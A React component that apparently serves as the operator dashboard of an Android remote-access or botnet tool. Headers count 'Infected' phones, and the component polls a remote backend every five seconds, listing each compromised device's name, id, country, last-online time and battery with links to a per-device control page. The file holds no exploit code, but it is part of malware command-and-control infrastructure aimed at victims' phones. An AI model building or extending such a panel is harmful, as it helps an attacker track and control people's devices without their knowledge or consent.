import React, { useState, useEffect } from "react";
import "./style.css";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import {
  faBatteryFull,
  faEllipsis,
  faEarthAmericas,
  faCalendar,
} from "@fortawesome/free-solid-svg-icons";
import { faAndroid } from "@fortawesome/free-brands-svg-icons";
import { useNavigate } from "react-router-dom";

function Aphones() {
  const [active, setActive] = useState("All");
  const [devices, setDevices] = useState([]);
  const [counts, setCounts] = useState({ all: 0, online: 0, offline: 0, favorite: 0 });

  const navigate = useNavigate();

  const email = localStorage.getItem("email");

  const fetchCounts = async () => {
    try {
      const res = await fetch(`https://backend-ryzt.onrender.com/getdevice?email=${email}&conter=true`);
      const data = await res.json();
      setCounts(data);
    } catch (error) {
      console.error("Erro ao buscar contagem de dispositivos:", error);
    }
  };


  useEffect(() => {
    fetchDevices(active);
    fetchCounts();

    const interval = setInterval(() => {
      fetchDevices(active);
      fetchCounts();
    }, 5000);

    return () => clearInterval(interval);
  }, [active]);


  const fetchDevices = async (type = null) => {
    try {
      let url = `https://backend-ryzt.onrender.com/getdevice?email=${email}`;
      if (type && type !== "All") {
        url += `&type=${type}`;
      }

      const res = await fetch(url);
      const data = await res.json();
      setDevices(data);
    } catch (error) {
      console.error("Erro ao buscar dispositivos:", error);
    }
  };

  useEffect(() => {
    fetchDevices(active);

    const interval = setInterval(() => {
      fetchDevices(active);
    }, 5000);

    return () => clearInterval(interval);
  }, [active]);

  const handleCategoryClick = (category) => {
    setActive(category);
    fetchDevices(category);
  };

  const handleClick = (id) => {
    navigate(`/aphone?id=${id}`);
  };

  const categories = ["All", "Online", "Offline", "Favorite"];

  return (
    <>
      <div className="nav-top-main">
        <div className="boxs-inform">
          {["All", "Online", "Offline", "Favorite"].map((category) => {
            const key = category.toLowerCase();
            return (
              <div className="box" key={category}>
                <h1>
                  Aphones <span>{category}</span> <br /> Infected
                </h1>
                <h2>{counts[key] || 0}</h2>
              </div>
            );
          })}
        </div>
      </div>


      <div className="catery">
        <div className="text">
          <h1>Aphones </h1>
          <p>
            Lorem ipsum dolor sit amet consectetur adipisicing elit. Repellendus
            odit reiciendis et nihil hic aperiam harum non mollitia, ex, earum
            modi.
          </p>
        </div>

        <div className="category">
          {categories.map((category) => (
            <div
              key={category}
              className={`box-ca ${active === category ? "a" : ""}`}
              onClick={() => handleCategoryClick(category)}
            >
              {category}
            </div>
          ))}
        </div>
      </div>

      <div className="MainAphone">
        <div className="aphones">
          {devices.map((device) => (
            <div
              className="aphone-box"
              key={device.device_id}
              id={device.device_id}
              onClick={() => handleClick(device.device_id)}
            >
              <div className="oth">
                <div className="header">
                  <div className="content">
                    <FontAwesomeIcon
                      icon={faAndroid}
                      color="#B9B9BB"
                      style={{ fontSize: 40 }}
                    />

                    <div className="state">
                      <div
                        className="pont"
                        style={{
                          backgroundColor:
                            device.status === "Online" ? "green" : "red",
                        }}
                      ></div>
                      <p>{device.status}</p>
                    </div>
                  </div>
                  <div className="text">
                    <h1>
                      {device.device_name} - <br /> <span>{device.device_id}</span>
                    </h1>
                  </div>

                  <div className="box-inform">
                    <FontAwesomeIcon
                      icon={faEarthAmericas}
                      color="#B9B9BB"
                      style={{ fontSize: 15 }}
                    />
                    <h3>{device.country || "Desconhecido"}</h3>
                  </div>

                  <div className="box-inform">
                    <FontAwesomeIcon
                      icon={faCalendar}
                      color="#B9B9BB"
                      style={{ fontSize: 15 }}
                    />
                    <h3>{device.last_online || "Sem data"}</h3>
                  </div>
                </div>

                <div className="icon-header">
                  <FontAwesomeIcon
                    icon={faEllipsis}
                    color="#B9B9BB"
                    style={{ fontSize: 20 }}
                  />
                </div>
              </div>

              <div className="batery">
                <FontAwesomeIcon
                  icon={faBatteryFull}
                  color="#B9B9BB"
                  style={{ fontSize: 20, marginLeft: 5 }}
                />
                <h1>{device.battery}%</h1>
              </div>
            </div>
          ))}
        </div>
      </div>
    </>
  );
}

export default Aphones;